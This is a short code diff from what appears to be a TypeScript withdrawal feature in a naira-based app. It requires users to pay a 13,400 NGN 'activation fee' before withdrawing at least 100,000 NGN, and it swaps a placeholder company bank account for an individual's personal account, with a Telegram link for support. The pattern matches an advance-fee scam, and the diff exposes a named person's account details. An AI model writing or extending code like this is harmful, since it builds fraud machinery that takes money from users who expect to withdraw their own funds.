@@ -10,9 +10,9 @@ import { z } from "zod";
 
 const WITHDRAW_MIN_NGN = 100000;
 const WITHDRAW_ACTIVATION_FEE_NGN = 13400;
-const ACTIVATION_BANK_NAME = "Access Bank";
-const ACTIVATION_ACCOUNT_NAME = "BluePay Services";
-const ACTIVATION_ACCOUNT_NUMBER = "0123456789";
+const ACTIVATION_BANK_NAME = "Moniepoint MFB";
+const ACTIVATION_ACCOUNT_NAME = "CHINEMEREM LIBERTY SUNDAY";
+const ACTIVATION_ACCOUNT_NUMBER = "6957666738";
 const SUPPORT_TELEGRAM_URL = "https://t.me/+wYh9iSrC3YkyMTlk";
 
 const withdrawalSchema = z.object({
